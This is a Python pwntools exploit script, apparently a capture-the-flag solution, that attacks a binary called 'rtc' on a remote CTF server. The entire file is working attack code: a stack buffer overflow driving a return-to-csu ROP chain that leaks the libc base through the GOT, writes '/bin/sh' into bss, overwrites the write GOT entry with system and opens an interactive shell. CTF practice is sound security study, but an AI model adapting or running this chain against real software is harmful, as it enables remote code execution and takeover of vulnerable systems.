#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3025)
e = ELF("./rtc")
libc = ELF("./libc.so.6")
#context.log_level = 'debug'

popArgus = lambda r12, r13, r14, r15: p64(0x0) + p64(0x1) + p64(r12)\
        + p64(r13) + p64(r14) + p64(r15)
sla = lambda t, s: p.sendlineafter(t, s)
sl = lambda s: p.sendline(s)
so = lambda s: p.send(s)

padding = "C"*0x48
popGadget = 0x4006ba
movGadget = 0x4006a0
rsp = 0xDeADB3Ef
pr = 0x004006c3 # pop rdi ; ret

# Leak libc
payload = padding.encode('utf-8')
payload += p64(popGadget)
payload += popArgus(e.got['write'], 0x8, e.got['read'], 0x1)
payload += p64(movGadget)
payload += p64(rsp)
payload += popArgus(0x0, 0x0, 0x0, 0x0)
payload += p64(e.sym['main'])

sla("?\n", payload)

libcBase = u64(p.recvn(0x8)) - libc.sym['read']
log.info("libcBase address: " + hex(libcBase))

# Enter /bin/sh in bss
payload = padding.encode('utf-8')
payload += p64(popGadget)
payload += popArgus(e.got['read'], 0x7, e.bss() + 0x10, 0x0)
payload += p64(movGadget)
payload += p64(rsp)
payload += popArgus(0x0, 0x0, 0x0, 0x0)
payload += p64(e.sym['main'])

sla("?\n", payload)
so("/bin/sh")

# Tampering write GOT
system = libcBase + libc.sym['system']
payload = padding.encode('utf-8')
payload += p64(popGadget)
payload += popArgus(e.got['read'], 0x8, e.got['write'], 0x0)
payload += p64(movGadget)
payload += p64(rsp)
payload += popArgus(e.got['write'], 0x0, 0x0, e.bss() + 0x10)
payload += p64(movGadget)

sla("?\n", payload)
sleep(0.5)
so(p64(system))

p.interactive()
